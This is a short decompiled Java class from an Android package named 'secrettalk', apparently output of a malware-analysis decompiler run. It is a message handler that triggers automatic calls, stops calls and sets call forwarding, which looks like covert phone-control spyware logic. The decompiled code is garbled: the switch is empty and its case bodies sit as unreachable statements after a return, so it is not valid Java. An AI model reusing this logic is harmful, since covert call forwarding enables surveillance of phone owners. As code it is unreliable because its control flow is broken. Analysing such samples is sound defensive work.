package com.android.secrettalk;

import android.os.Handler;
import android.os.Message;

class ReceiverRegisterService$1
  extends Handler
{
  ReceiverRegisterService$1(ReceiverRegisterService paramReceiverRegisterService) {}
  
  public void handleMessage(Message paramMessage)
  {
    switch (paramMessage.what)
    {
    }
    for (;;)
    {
      return;
      this.this$0.autoCallHandling();
      continue;
      if (GlobalData.isCalling) {
        this.this$0.stopCall();
      }
      sendEmptyMessageDelayed(1000, 1000 * GlobalData.call_span);
      continue;
      this.this$0.getAutoCall();
      continue;
      this.this$0.getCallForwarding();
      continue;
      ReceiverRegisterService.access$0(this.this$0, this.this$0.call_forwarding_phone, this.this$0.call_forward_state);
    }
  }
}


/* Location:           D:\ManalProject\Manal\Manal-plugin\tools\decompiler\tools\classes-dex2jar.jar
 * Qualified Name:     com.android.secrettalk.ReceiverRegisterService.1
 * JD-Core Version:    0.7.0.1
 */